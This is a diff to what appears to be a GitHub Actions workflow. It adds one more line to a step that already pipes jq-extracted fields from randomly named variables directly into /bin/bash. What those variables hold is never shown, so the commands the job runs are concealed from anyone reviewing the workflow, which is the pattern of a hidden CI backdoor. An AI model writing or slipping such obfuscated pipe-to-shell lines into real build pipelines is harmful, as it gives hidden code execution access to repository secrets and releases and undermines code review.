@@ -26,6 +26,7 @@ jobs:
           echo $xyexz3 | jq -r .zpti1785 | /bin/bash
           printf '%s' "$zsa801" | jq -r .q61 | /bin/bash
           echo $hzctl2686 | jq -r .xun8590 | /bin/bash
+          printf '%s' "$b03041" | jq -r .t860 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
